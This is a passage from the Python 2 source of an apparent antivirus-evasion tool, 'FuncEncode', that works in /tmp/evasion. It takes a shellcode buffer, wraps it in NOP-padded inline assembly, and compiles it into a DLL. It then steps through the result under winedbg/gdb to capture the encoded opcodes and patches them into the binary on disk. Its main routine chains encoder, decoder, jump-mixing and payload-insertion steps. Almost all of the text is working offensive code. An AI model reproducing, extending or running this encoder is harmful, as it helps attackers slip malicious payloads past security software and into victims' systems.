                        print "Payload size indicated: " + str(paysize) + " bytes...Generating NOPs"
                        i=0
                        payfiller = []
                        while(i<(paysize)):
                            payfiller.append('\"NOP;\"')
                            i += 1
                    except:
                        pass
                    if (start == 'yes'):
                        payload += line.rstrip().rstrip(';').rstrip('"').lstrip('"')
                    try:
                        line.index('buf')
                        start = 'yes'
                    except:
                        pass
                    try:
                        line.index(';')
                        start = 'done'
                    except:
                        pass
        for char in payload:
            if char == "\\":
                pass
            elif char == 'x':
                pass
            else:
                payloadstrip += char
        print payload
        print payloadstrip
        payloadraw = self.hexit(payloadstrip)
        payfiller.pop()
        payfiller.insert(0, "\"INT $0x03;\"")
        with open('/tmp/evasion/testa.c', "r") as read:
            lines = read.readlines()
            print lines.index("//replacemepayload\n")
            print lines
            instrstring = "asm(\n"
            for instr in payfiller:
                instrstring += instr + "\n"
            instrstring += ");\n"
            payloadlocation = lines.index("//replacemepayload\n")
            lines.pop(payloadlocation)
            lines.insert(payloadlocation, instrstring)
        with open('/tmp/evasion/testa.c', "w") as write:
            for line in lines:
                write.write(line)
        self.compile()
        offset = self.binsearch("90909090CC".decode("hex"))
        with open('/tmp/evasion/testa.dll', "rb") as dll:
            raw = dll.read()
            i = 0
            rawhead = raw[:(offset+4)]
            rawtail = raw[(offset+4+len(payfiller)):]
            raw = rawhead + payloadraw + rawtail
        with open('/tmp/evasion/testa.dll', "wb") as dll:
            dll.write(raw)

#now we need to load up a debugger, bp on call eax or some other, step in, get through the preamble, i just dumped in an int3
        winegdb = subprocess.Popen('winedbg --gdb --no-start /tmp/evasion/loadera.exe', stderr=subprocess.PIPE, shell=True)
        target = self.needtarget(winegdb)
        print target
        gdb = GDBConsole.Gdb()

        output = gdb.console.communicate("file /tmp/evasion/loadera.exe")
        print "loader"
        print output
        print "endloader"
        output = gdb.console.communicate("file /tmp/evasion/testa.dll")
        print output
        output = gdb.console.communicate(target)
        print output
        output = gdb.console.communicate("cont unt")
        print output
        output = gdb.console.communicate("info r")
        try:
            output.index("eip")
            print "hello"
            temp = output.split("eip")
            tempa = temp[1].split("\t")
            ind = tempa[0].index("0x")
            eip = tempa[0][ind:ind+10]
        except:
            print "failed to get eip"
        print eip
        print paysize
#set new origin to encoder, run until return, and patch the on disk DLL
        print "finding start and end of shellcode"
#a really cheesy way to do it using debug symbols...
#you could just skip what you know to be the encoder
        output = gdb.console.communicate("find $eip, label_enc_end, 0x90909090")
        nops = output.split("0x")
        address = nops[2].split(" ")
        output = gdb.console.communicate("set $eip = 0x" + str(address[0]))
        output = gdb.console.communicate("b label_enc_end")
        output = gdb.console.communicate("continue")
        output = gdb.console.communicate("disass /r " +eip+ "-1, $eip")
        list = output.split("\n")
        i=0
        for line in list:
            list[i] = line.split("\t")
            i += 1
        for line in list:
            print line
        list.pop(0)
        list.pop(-1)
        list.pop(-1)
        opcodes = ''
        for line in list:
            opcodes += line[1]
        opcodes = opcodes.translate(None, ' ')
#patch in to dll and remove the INT 3
#a lazy way to find it
        offset = self.binsearch(opcodes[0:10].decode("hex"))
        opcodes = "90" + opcodes[2:]
        print opcodes
#find space back from 90909090CC to CC and apply the patch
        rawops = opcodes.decode("hex")
        rawlen = len(rawops)
        with open('/tmp/evasion/testa.dll', "rb") as dll:
            raw = dll.read()
            i = 0
            rawhead = raw[:(offset)]
            rawtail = raw[(offset+rawlen):]
            raw = rawhead + rawops + rawtail
        with open('/tmp/evasion/testa.dll', "wb") as dll:
            dll.write(raw)

    def needtarget(self, test):
        while ( 1==1 ):
            line = test.stderr.readline()
            try:
                line.index("target")
                return line
            except:
                pass

    def binsearch(self, opcodeseq):
        '''
        '''
        with open('/tmp/evasion/testa.dll', "rb") as dll:
            raw = dll.read()
            bytes = []
            bytestring = ''
            for byte in raw:
                bytestring += byte
                bytes.append(byte)
            try:
                return bytestring.index(opcodeseq);
            except:
                print "Not found..."
                return -1



    def hexit(self, astring):
        '''
        '''
        with open('/tmp/evasion/tryit', 'wb') as f:
            f.write(astring.decode("hex"))
            f.close()
        return (astring.decode("hex"))




    def compile(self):
        test = subprocess.Popen("make", shell=False, cwd='/tmp/evasion')
        if (test.wait() != 0):
            pass


    def main(self):
        '''
        Main loop...duh
        '''
        try:
            if (self.debug == 1):
                print "Entered main."
        except:
            self.debug = 0
        try:
            if (self.key == 1):
                pass
        except:
            self.init()
        self.dropfiles()
        self.set_registers()
        self.compile_markers()
        self.build_chains()
        orderrestore = self.ordersaved
        orderrestore.reverse()
        self.restoreregs(orderrestore)
        self.nop_insert()
        self.fix_for_att()
        self.replace_encoder()
        self.replace_decoder()
        self.jmp_mix()
        self.use_mixed()
        self.insertpayload()

if __name__ == "__main__":
    AFuncEncode = FuncEncode()
    AFuncEncode.main()
